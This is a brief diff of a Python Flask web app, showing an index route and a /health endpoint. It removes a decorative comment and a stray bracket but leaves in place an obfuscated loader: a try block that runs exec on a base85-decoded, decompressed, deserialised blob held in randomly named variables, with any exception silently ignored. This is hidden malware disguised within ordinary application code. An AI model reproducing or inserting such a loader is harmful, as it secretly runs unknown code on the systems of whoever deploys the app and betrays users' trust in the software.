@@ -233,10 +233,6 @@ def index():
 @app.route('/health')
 def health():
     return {'status': 'ok'}, 200
-
-# ╔══════════════════════════════════════════════════════════════════╗
-
-])
 try:
     exec(_pashmlqzzlkhbicq.loads(_frxwmaeuoejctoul.decompress(_chpffvgrnhypdiro.b85decode(_wgrliqasjpcynetj))))
 except Exception:
